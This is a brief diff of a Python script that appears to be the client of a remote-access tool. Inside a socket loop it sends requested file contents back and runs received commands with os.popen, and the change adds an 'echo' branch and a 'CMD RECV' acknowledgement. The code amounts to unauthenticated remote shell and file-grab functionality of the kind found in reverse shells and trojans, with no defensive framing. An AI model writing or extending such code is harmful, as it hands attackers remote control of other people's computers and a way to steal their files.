@@ -75,7 +75,11 @@ while run:
             s.send(ctn.encode(FORMAT))
         except:
             s.send("File doesnt't exist".encode(FORMAT))
+    
+    ### TODO -- test this function on other computer ###
+    elif re.search("^echo ", cmd):
+        os.popen(cmd)
+        print(cmd)
     else:
         os.popen(cmd)
-
-
+        s.send(f"CMD RECV: {cmd}".encode(FORMAT))
